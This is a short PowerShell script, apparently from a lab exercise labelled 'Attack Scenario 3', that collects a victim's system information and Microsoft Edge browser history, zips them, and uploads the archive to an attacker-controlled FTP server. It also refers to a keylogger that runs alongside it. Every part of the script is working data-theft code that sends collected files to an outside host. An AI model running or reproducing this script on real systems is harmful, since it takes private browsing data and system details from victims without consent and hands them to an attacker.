# This script is part of Attack Scenario 3:
# It collects the victim's browser history from Microsoft Edge as well as SystemInfo before zipping them
# together and uploading them to an FTP server hosted by our attacker machine

# First wait a short period of time (allows the keylogger time to collect data)
Start-Sleep -Seconds 5

# Run the systemInfo command and save the output to a .txt file
systemInfo > C:\Windows\Temp\Exfil\sysinfo.txt

# Find the full file path to the User's browser history file (we don't know the username, so use the UserName env variable)
$browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"

# Copy the browser history file to our Exfil directory
cp $browsing_history_file_path C:\Windows\Temp\Exfil

# Create a zip file of the contents in the Exfil directory
Compress-Archive -LiteralPath C:\Windows\Temp\Exfil -DestinationPath C:\Windows\Temp\Exfil.zip

# Create a connection to our attacker's FTP server and upload our zipped file
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("kali", "kali")
$client.UploadFile("ftp://[ip]/Exfil.zip", "C:\Windows\Temp\Exfil.zip")
